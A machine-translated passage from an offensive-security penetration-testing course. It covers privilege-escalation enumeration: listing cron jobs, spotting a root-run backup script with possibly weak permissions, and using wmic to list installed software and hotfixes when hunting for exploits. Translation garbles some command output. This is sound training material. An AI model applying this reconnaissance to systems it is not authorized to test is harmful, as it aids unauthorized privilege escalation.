<div style="position:absolute;top:99062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录，其中</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表示任务运行的频率。</font><font style="vertical-align: inherit;">例如，将要执行的任务</font></font></nobr></div>
<div style="position:absolute;top:99081;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每天运行可以在 /etc/cron.daily 下找到。</font><font style="vertical-align: inherit;">每个脚本都列在其自己的子目录中。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:99116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -lah /etc/cron*</font></font></font></b></nobr></div>
<div style="position:absolute;top:99133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 root root 722 Oct 7 2017 /etc/crontab</font></font></nobr></div>
<div style="position:absolute;top:99167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/cron.d:</font></font></nobr></div>
<div style="position:absolute;top:99184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 根 285 2017 年 5 月 29 日 anacron</font></font></nobr></div>
<div style="position:absolute;top:99201;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 根 712 2017 年 1 月 1 日 php</font></font></nobr></div>
<div style="position:absolute;top:99218;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 根 102 Oct 7 2017 .placeholder</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:99252;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/cron.daily </font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:99269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 根 311 2017 年 5 月 29 日 0anacron</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:99286;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 根 539 2018 年 3 月 30 日 apache2</font></font></b></nobr></div>
<div style="position:absolute;top:99303;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 根 1.5K 2017 年 9 月 13 日 apt-compat</font></font></b></nobr></div>
<div style="position:absolute;top:99320;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 根 2016 年 10 月 25 日 355 bsdmainutils</font></font></b></nobr></div>
<div style="position:absolute;top:99337;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 root root 384 2012 年 12 月 12 日裂纹库运行时</font></font></b></nobr></div>
<div style="position:absolute;top:99354;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 根 1.6K 2017 年 2 月 22 日 dpkg</font></font></b></nobr></div>
<div style="position:absolute;top:99370;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 根根 89 2015 年 5 月 5 日 logrotate</font></font></b></nobr></div>
<div style="position:absolute;top:99387;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 root root 1.1K 2016 年 12 月 13 日 man-db</font></font></b></nobr></div>
<div style="position:absolute;top:99405;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 root root 249 2017 年 5 月 17 日 passwd</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:99422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 根 102 Oct 7 2017 .placeholder</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:99455;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/cron.hourly </font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:99472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 根 102 Oct 7 2017 .placeholder</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:99506;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/cron.monthly </font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:99523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 根 313 2017 年 5 月 29 日 0anacron</font></font></nobr></div>
<div style="position:absolute;top:99540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 根 102 Oct 7 2017 .placeholder</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:99574;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/cron.weekly </font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:99591;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 根 312 2017 年 5 月 29 日 0anacron</font></font></nobr></div>
<div style="position:absolute;top:99608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 root root 723 2016 年 12 月 13 日 man-db</font></font></nobr></div>
<div style="position:absolute;top:99625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 根 102 Oct 7 2017 .placeholder</font></font></nobr></div>
<div style="position:absolute;top:99645;left:341"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 533 - 列出 Linux 上的所有 cron 作业</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:99674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列出目录内容，我们注意到计划每天运行的几个任务。</font></font></nobr></div>
<div style="position:absolute;top:99707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值得注意的是，系统管理员经常会在</font></font></nobr></div>
<div style="position:absolute;top:99726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/crontab 文件。</font><font style="vertical-align: inherit;">应仔细检查这些任务是否存在不安全的文件权限，因为大多数</font></font></nobr></div>
<div style="position:absolute;top:99746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此特定文件中的作业将以 root 身份运行。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:99839;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">467 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Cron</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:99967;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="85"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 85 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:100000;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:101077;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:101077;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:101077;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">526</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:100098;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /etc/crontab</font></font></font></b></nobr></div>
<div style="position:absolute;top:100115;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:100149;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳=/bin/sh</font></font></nobr></div>
<div style="position:absolute;top:100166;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</font></font></nobr></div>
<div style="position:absolute;top:100200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># mh dom mon dow 用户命令</font></font></nobr></div>
<div style="position:absolute;top:100216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17 * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly</font></font></nobr></div>
<div style="position:absolute;top:100233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25 6 * * * 根测试 -x /usr/sbin/anacron || </font><font style="vertical-align: inherit;">( cd / &amp;&amp; run-parts --report /etc</font></font></nobr></div>
<div style="position:absolute;top:100251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/cron.daily )</font></font></nobr></div>
<div style="position:absolute;top:100268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">47 6 * * 7 根测试 -x /usr/sbin/anacron || </font><font style="vertical-align: inherit;">( cd / &amp;&amp; run-parts --report /etc</font></font></nobr></div>
<div style="position:absolute;top:100285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/cron.weekly )</font></font></nobr></div>
<div style="position:absolute;top:100301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">52 6 1 * * 根测试 -x /usr/sbin/anacron || </font><font style="vertical-align: inherit;">( cd / &amp;&amp; run-parts --report /etc</font></font></nobr></div>
<div style="position:absolute;top:100318;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/cron.monthly )</font></font></nobr></div>
<div style="position:absolute;top:100335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5 0 * * *   </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:100335;left:271"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/var/scripts/user_backups.sh</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:100355;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 534 - /etc/crontab 文件示例</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:100384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此示例显示了以 root 身份运行的备份脚本。</font><font style="vertical-align: inherit;">如果这个文件的权限很弱，我们可能会</font></font></nobr></div>
<div style="position:absolute;top:100404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">能够利用这一点来提升我们的特权。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:100438;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1.1.8 枚举已安装的应用程序和补丁级别</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:100472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在某些时候，我们可能需要利用漏洞来提升我们的本地权限。</font><font style="vertical-align: inherit;">如果是这样，我们的搜索</font></font></nobr></div>
<div style="position:absolute;top:100492;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个有效的漏洞利用开始于所有已安装的应用程序的枚举，注意版本</font></font></nobr></div>
<div style="position:absolute;top:100511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每个（以及基于 Windows 的系统上的操作系统补丁级别）。</font><font style="vertical-align: inherit;">我们可以使用这些信息来</font></font></nobr></div>
<div style="position:absolute;top:100530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索匹配的漏洞利用。</font></font></nobr></div>
<div style="position:absolute;top:100563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手动搜索此信息可能非常耗时且效率低下。</font><font style="vertical-align: inherit;">然而，</font></font></nobr></div>
<div style="position:absolute;top:100583;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以利用非常强大的基于 Windows 的实用程序</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmic</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 468</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自动化这个过程</font></font></nobr></div>
<div style="position:absolute;top:100602;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">视窗系统。</font></font></nobr></div>
<div style="position:absolute;top:100635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmic 实用程序提供对</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Management Instrumentation </font></font></i><font style="vertical-align: inherit;"></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">469 的</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问</font><font style="vertical-align: inherit;">，</font><font style="vertical-align: inherit;">它是</font></font></nobr></div>
<div style="position:absolute;top:100654;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Windows 上管理数据和操作的基础设施。</font></font></nobr></div>
<div style="position:absolute;top:100687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以将 wmic 与</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">product</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 470</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> WMI 类参数一起使用，后跟</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">get</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，作为名称</font></font></nobr></div>
<div style="position:absolute;top:100706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">状态，用于检索特定的属性值。</font><font style="vertical-align: inherit;">然后我们可以选择我们的属性</font></font></nobr></div>
<div style="position:absolute;top:100726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">感兴趣，例如</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">name</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">version</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">vendor</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:100759;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要记住的一件重要事情是产品 WMI 类只列出了</font></font></nobr></div>
<div style="position:absolute;top:100778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Installer 安装</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">471</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它不会列出不使用 Windows 的应用程序</font></font></nobr></div>
<div style="position:absolute;top:100797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装人员。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:100832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c:\Users\student&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmic 产品获取名称、版本、供应商</font></font></font></b></nobr></div>
<div style="position:absolute;top:100849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:100849;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">小贩    </font></font></nobr></div>
<div style="position:absolute;top:100849;left:684"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版本</font></font></nobr></div>
<div style="position:absolute;top:100866;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft OneNote MUI（英文）2016 Microsoft Corporation 16.0.4266.1001</font></font></nobr></div>
<div style="position:absolute;top:100883;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Office OSM MUI（英文）2016 Microsoft Corporation 16.0.4266.1001</font></font></nobr></div>
<div style="position:absolute;top:100900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软办公标准 2016    </font></font></nobr></div>
<div style="position:absolute;top:100900;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软公司 16.0.4266.1001</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:100967;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">468 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic</font></font></font></nobr></div>
<div style="position:absolute;top:100987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">469 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page</font></font></font></nobr></div>
<div style="position:absolute;top:101007;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">470 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2015 年） https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa394378(v%3Dvs.85)</font></font></font></nobr></div>
<div style="position:absolute;top:101027;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">471 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-portal</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:101155;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="86"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 86 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:101188;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:102265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:102265;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:102265;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">527</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:101284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Office OSM UX MUI（英文）2016 Microsoft Corporation 16.0.4266.1001</font></font></nobr></div>
<div style="position:absolute;top:101300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Office 共享设置元数据 MUI Microsoft Corporation 16.0.4266.1001</font></font></nobr></div>
<div style="position:absolute;top:101317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Excel MUI（英文）2016    </font></font></nobr></div>
<div style="position:absolute;top:101317;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软公司 16.0.4266.1001</font></font></nobr></div>
<div style="position:absolute;top:101334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft PowerPoint MUI（英文）2016 Microsoft Corporation 16.0.4266.1001</font></font></nobr></div>
<div style="position:absolute;top:101352;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Publisher MUI（英文）2016 Microsoft Corporation 16.0.4266.1001</font></font></nobr></div>
<div style="position:absolute;top:101368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Outlook MUI（英文）2016 Microsoft Corporation 16.0.4266.1001</font></font></nobr></div>
<div style="position:absolute;top:101385;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Groove MUI（英文版）2016    </font></font></nobr></div>
<div style="position:absolute;top:101385;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软公司 16.0.4266.1001</font></font></nobr></div>
<div style="position:absolute;top:101402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Word MUI（英文）2016    </font></font></nobr></div>
<div style="position:absolute;top:101402;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软公司 16.0.4266.1001</font></font></nobr></div>
<div style="position:absolute;top:101419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Office Proofing (English) 2016 Microsoft Corporation 16.0.4266.1001</font></font></nobr></div>
<div style="position:absolute;top:101436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Office 共享 MUI（英文）2016 Microsoft Corporation 16.0.4266.1001</font></font></nobr></div>
<div style="position:absolute;top:101453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Office 校对工具 2016 - Microsoft Corporation 16.0.4266.1001</font></font></nobr></div>
<div style="position:absolute;top:101470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Microsoft Corporation 16.0.4266.1001 的更正说明</font></font></nobr></div>
<div style="position:absolute;top:101487;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Outils de verification linguistique 2016 Microsoft Corporation 16.0.4266.1001</font></font></nobr></div>
<div style="position:absolute;top:101504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Visual C++ 2017 x86 附加 Microsoft Corporation 14.12.25810</font></font></nobr></div>
<div style="position:absolute;top:101521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端    </font></font></nobr></div>
<div style="position:absolute;top:101521;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Fortinet公司    </font></font></nobr></div>
<div style="position:absolute;top:101521;left:684"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.2.3.0633</font></font></nobr></div>
<div style="position:absolute;top:101538;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">蟒蛇 2.7.14    </font></font></nobr></div>
<div style="position:absolute;top:101538;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Python 软件基础 2.7.14150</font></font></nobr></div>
<div style="position:absolute;top:101555;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VMware工具    </font></font></nobr></div>
<div style="position:absolute;top:101555;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VMware, Inc.    </font></font></nobr></div>
<div style="position:absolute;top:101555;left:684"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.3.10.1240696</font></font></nobr></div>
<div style="position:absolute;top:101572;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Visual C++ 2017 x86 最低 Microsoft Corporation 14.12.25810</font></font></nobr></div>
<div style="position:absolute;top:101589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Visual C++ 2008 Redistributable Microsoft Corporation 9.0.30729.4148</font></font></nobr></div>
<div style="position:absolute;top:101608;left:270"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 535 - 列出安装在 Windows 上的所有已安装应用程序</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:101638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们寻找权限提升攻击时，有关已安装应用程序的信息可能很有用。</font></font></nobr></div>
<div style="position:absolute;top:101670;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同样，更重要的是，wmic 也可用于通过查询</font></font></nobr></div>
<div style="position:absolute;top:101690;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Win32_QuickFixEngineering (qfe) </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">472</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> WMI 类。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:101725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c:\Users\student&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmic qfe 获取标题、描述、HotFixID、InstalledOn</font></font></font></b></nobr></div>
<div style="position:absolute;top:101742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标题    </font></font></nobr></div>
<div style="position:absolute;top:101742;left:465"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">说明 HotFixID InstalledOn</font></font></nobr></div>
<div style="position:absolute;top:101759;left:465"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更新    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:101759;left:603"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">KB2693643 4/7/2018</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:101776;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://support.microsoft.com/?kbid=4088785 安全更新 KB4088785 3/31/2018</font></font></nobr></div>
<div style="position:absolute;top:101793;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://support.microsoft.com/?kbid=4090914 更新    </font></font></nobr></div>
<div style="position:absolute;top:101793;left:603"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">KB4090914 3/31/2018</font></font></nobr></div>
<div style="position:absolute;top:101809;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://support.microsoft.com/?kbid=4088776 安全更新 KB4088776 3/31/2018</font></font></nobr></div>
<div style="position:absolute;top:101829;left:283"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 536 - 列出 Windows 上所有已安装的安全补丁</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
